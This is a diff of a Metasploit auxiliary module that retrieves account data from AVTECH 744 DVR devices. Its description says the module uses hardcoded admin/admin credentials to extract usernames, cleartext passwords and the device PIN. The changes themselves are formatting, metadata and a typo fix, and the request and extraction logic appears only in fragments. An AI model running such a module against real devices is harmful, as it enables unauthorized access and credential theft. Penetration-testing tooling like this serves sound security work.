@@ -1,25 +1,34 @@
-require 'msf/core'
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'AVTECH 744 DVR Account Information Retrieval',
-      'Description'    => %q{
-        This module will extract the account information from the AVTECH 744 DVR devices,
-        including usernames, cleartext passwords, and the device PIN, along with
-        a few other miscellaneous details. In order to extract the information, hardcoded
-        credentials admin/admin are used. These credentials can't be changed from the device
-        console UI nor from the web UI.
-      },
-      'Author'         => [ 'nstarke' ],
-      'License'        => MSF_LICENSE
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'AVTECH 744 DVR Account Information Retrieval',
+        'Description' => %q{
+          This module will extract the account information from the AVTECH 744 DVR devices,
+          including usernames, cleartext passwords, and the device PIN, along with
+          a few other miscellaneous details. In order to extract the information, hardcoded
+          credentials admin/admin are used. These credentials can't be changed from the device
+          console UI nor from the web UI.
+        },
+        'Author' => [ 'nstarke' ],
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
   end
-
 
   def run
     res = send_request_cgi({
@@ -37,7 +46,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     unless res.code == 200
-      fail_with(Failure::Unknown, 'An unknown error occured')
+      fail_with(Failure::Unknown, 'An unknown error occurred')
     end
 
     raw_collection = extract_data(res.body)
